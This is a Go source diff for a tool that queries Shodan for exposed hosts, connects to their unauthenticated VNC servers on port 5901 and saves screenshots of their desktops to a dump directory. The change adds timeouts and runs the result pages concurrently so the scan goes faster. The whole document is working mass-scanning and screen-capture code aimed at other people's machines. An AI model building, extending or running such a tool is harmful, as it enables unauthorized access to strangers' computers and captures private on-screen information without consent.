@@ -5,6 +5,7 @@ import (
 	"flag"
 	"fmt"
 	"github.com/mitchellh/go-vnc"
+	"github.com/pkg/errors"
 	"gopkg.in/ns3777k/go-shodan.v3/shodan"
 	"image"
 	"image/color"
@@ -13,8 +14,11 @@ import (
 	"net"
 	"os"
 	"path"
+	"sync"
 	"time"
 )
+
+const timeout = 10
 
 func screenCapture(host string, port int, filename string) (err error) {
 	address := fmt.Sprintf("%s:%d", host, port)
@@ -36,13 +40,26 @@ func screenCapture(host string, port int, filename string) (err error) {
 	}
 	defer c.Close()
 
-	err = c.FramebufferUpdateRequest(false, 0, 0, c.FrameBufferWidth, c.FrameBufferHeight)
+	out := make(chan error)
+	go func() {
+		out <- c.FramebufferUpdateRequest(false, 0, 0, c.FrameBufferWidth, c.FrameBufferHeight)
+	}()
 
+	select {
+	case err = <-out:
+	case <-time.After(timeout * time.Second):
+		err = errors.New("timeout")
+	}
 	if err != nil {
 		return err
 	}
 
-	msg := <-ch
+	var msg vnc.ServerMessage
+	select {
+	case msg = <-ch:
+	case <-time.After(timeout * time.Second):
+		return errors.New("timeout")
+	}
 
 	rects := msg.(*vnc.FramebufferUpdateMessage).Rectangles
 	fmt.Println()
@@ -73,6 +90,21 @@ func screenCapture(host string, port int, filename string) (err error) {
 	return nil
 }
 
+func screenCaptureHosts(hosts []*shodan.HostData, dumpdir *string, group *sync.WaitGroup) {
+	for _, host := range hosts {
+		ip := host.IP.String()
+		imgname := fmt.Sprintf("%d_%s.png", time.Now().UnixNano(), ip)
+		filepath := path.Join(*dumpdir, imgname)
+		err := screenCapture(ip, 5901, filepath)
+		if err != nil {
+			log.Printf("ERROR: %s %v", ip, err)
+			continue
+		}
+		log.Printf("INFO: dumping screenshot from %s to %s", ip, filepath)
+	}
+	group.Done()
+}
+
 func main() {
 	dumpdir := flag.String("dumpdir", "/tmp/vncdumps", "screenshots will be dumped to this directory")
 	logfile := flag.String("logfile", "slideshow.log", "logfile location")
@@ -96,6 +128,8 @@ func main() {
 
 	client := shodan.NewEnvClient(nil)
 
+	group := sync.WaitGroup{}
+	group.Add(*pages)
 	for page := 0; page < *pages; page++ {
 		queryOptions := &shodan.HostQueryOptions{
 			Query: *query,
@@ -103,21 +137,11 @@ func main() {
 		}
 
 		hosts, err := client.GetHostsForQuery(context.Background(), queryOptions)
-
 		if err != nil {
 			log.Panic(err)
 		}
 
-		for _, host := range hosts.Matches {
-			ip := host.IP.String()
-			imgname := fmt.Sprintf("%d_%s.png", time.Now().UnixNano(), ip)
-			filepath := path.Join(*dumpdir, imgname)
-			err = screenCapture(ip, 5901, filepath)
-			if err != nil {
-				log.Printf("ERROR: %s %v", ip, err)
-				continue
-			}
-			log.Printf("INFO: dumped VNC screenshot from host %s to %s", ip, filepath)
-		}
+		go screenCaptureHosts(hosts.Matches, dumpdir, &group)
 	}
+	group.Wait()
 }
